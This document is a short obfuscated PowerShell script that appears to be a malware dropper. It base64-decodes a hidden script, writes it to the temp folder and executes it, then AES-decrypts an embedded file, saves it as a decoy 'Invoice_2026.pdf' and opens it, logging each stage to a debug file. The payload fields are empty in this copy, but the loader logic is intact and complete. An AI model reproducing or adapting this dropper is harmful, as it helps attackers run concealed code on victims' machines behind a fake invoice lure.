$ErrorActionPreference='Continue'
try{
$ezakqq=[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String(''))
$ehiowz="$env:TEMP\yzjadyoi.ps1"
[IO.File]::WriteAllText($ehiowz,$ezakqq,[Text.Encoding]::UTF8)
"[step1] reg script written to $ehiowz" | Out-File "$env:TEMP\pdfdrp_debug.txt" -Append
. $ehiowz
"[step1] reg script done" | Out-File "$env:TEMP\pdfdrp_debug.txt" -Append
$yscftc=[Convert]::FromBase64String('reiqlquhhl2IiFVMunQAJ9QSC/cW0nguDpskVssGbts=')
$fgrahz=[Convert]::FromBase64String('+WPBpmfaiXiv/YUIK7MUpQ==')
$ifacxa=[Convert]::FromBase64String('')
$pdysqr=New-Object Security.Cryptography.AesManaged
$pdysqr.Key=$yscftc;$pdysqr.IV=$fgrahz;$pdysqr.Mode='CBC';$pdysqr.Padding='PKCS7'
$pjkdkd=$pdysqr.CreateDecryptor()
$jdizjf=New-Object IO.MemoryStream(,$ifacxa)
$wdqayn=New-Object Security.Cryptography.CryptoStream($jdizjf,$pjkdkd,[Security.Cryptography.CryptoStreamMode]::Read)
$kbsauo=New-Object IO.MemoryStream
$wdqayn.CopyTo($kbsauo);$pdysqr.Dispose()
$vhpaqv="$env:TEMP\Invoice_2026.pdf"
[IO.File]::WriteAllBytes($vhpaqv,$kbsauo.ToArray())
"[step2] PDF written to $vhpaqv" | Out-File "$env:TEMP\pdfdrp_debug.txt" -Append
Start-Process $vhpaqv
"[step3] PDF opened" | Out-File "$env:TEMP\pdfdrp_debug.txt" -Append
}catch{
"[ERROR] $($_.Exception.Message) at line $($_.InvocationInfo.ScriptLineNumber)" | Out-File "$env:TEMP\pdfdrp_debug.txt" -Append
}
